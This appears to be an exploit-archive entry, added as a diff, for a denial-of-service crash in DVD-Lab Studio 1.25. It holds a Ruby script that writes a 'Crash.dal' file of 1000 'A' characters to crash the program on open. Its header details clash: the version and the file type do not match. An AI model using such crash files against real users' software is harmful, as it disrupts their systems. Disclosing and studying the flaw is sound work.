@@ -1,0 +1,27 @@
+DVD-Lab Studio 1.25 DAL File Open Crash
+===================================================================================
+# Exploit Title:DVD-Lab Studio 1.25 Malicious DAL File Denial of service
+# Download link:http://download.cnet.com/DVD-Lab-Studio/3000-7970_4-10391372.html
+# Author: Ahmed Elhady Mohamed
+# Email : ahmed.elhady.mohamed@gmail.com
+# Website: www.infosec4all.tk
+# version: 5.2.4
+# Category: DOS
+# Tested on: windows XP SP3
+===================================================================================
+
+
+
+#########################################################################################
+#DVD-Lab Studio File Denial of service vulnerability ,when opening a malicious .PCX file#                                                                  #
+#To trigger the exploit , go to file->Open                                              #
+#########################################################################################
+
+ 
+#!/usr/bin/ruby
+ 
+
+File.open "Crash.dal" , "w" do |file|
+junk = "A" *1000
+file.write junk
+end
